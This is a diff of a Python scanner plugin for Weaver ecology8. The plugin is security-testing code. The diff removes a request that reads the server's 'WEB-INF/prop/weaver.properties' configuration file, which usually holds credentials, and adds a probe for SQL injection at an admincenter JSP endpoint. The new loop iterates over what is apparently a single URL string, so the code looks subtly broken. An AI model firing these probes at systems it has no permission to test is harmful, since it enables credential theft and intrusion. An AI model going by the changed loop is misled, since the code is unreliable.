@@ -11,29 +11,25 @@ from script import Script
 class POC(Script):
     def __init__(self, target=None):
         self.service_type = SERVICE_PORT_MAP.WEB
-        self.name = 'ecology8 download'
-        self.keyword = ['ecology8', 'download']
-        self.info = 'ecology8 download2'
-        self.type = VUL_TYPE.INFO
+        self.name = 'ecology8 admincenter sql inject'
+        self.keyword = ['ecology8', 'sql inject']
+        self.info = 'ecology8 admincenter sql inject'
+        self.type = VUL_TYPE.SQL
         self.level = VUL_LEVEL.HIGH
         Script.__init__(self, target=target, service_type=self.service_type)
 
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
-                    url = path + "weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties"
+                for path in self.url_normpath(self.url, './'):
+                    url = path +"admincenter/interfaces/interfaceCheckExists.jsp?className="
 
                     async with session.get(url=url) as res:
-                        if res != None:
+                        if res!=None:
                             text = await res.text()
-                            if 'DriverClasses' in text:
+                            if 'false' == text.replace('\r','').replace('\n','').replace(' ',''):
                                 self.flag = 1
                                 self.req.append({"url": url})
-                                self.res.append({"info": url, "key": "ecology8 download2"})
+                                self.res.append({"info": url, "key": "ecology8 inject"})
                                 return
